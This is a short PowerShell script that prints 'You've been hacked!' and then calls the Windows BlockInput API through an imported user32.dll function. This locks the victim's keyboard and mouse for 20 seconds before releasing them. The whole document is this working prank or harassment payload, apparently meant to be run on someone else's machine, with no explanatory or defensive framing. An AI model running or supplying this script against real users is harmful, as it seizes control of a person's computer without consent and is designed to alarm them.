Write-Host "`nYou've been hacked!`n"

$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    try {
        $userInput::BlockInput($true)
        Start-Sleep $seconds
    }
    finally {
        $userInput::BlockInput($false)
    }
}

Disable-UserInput -seconds 20 | Out-Null
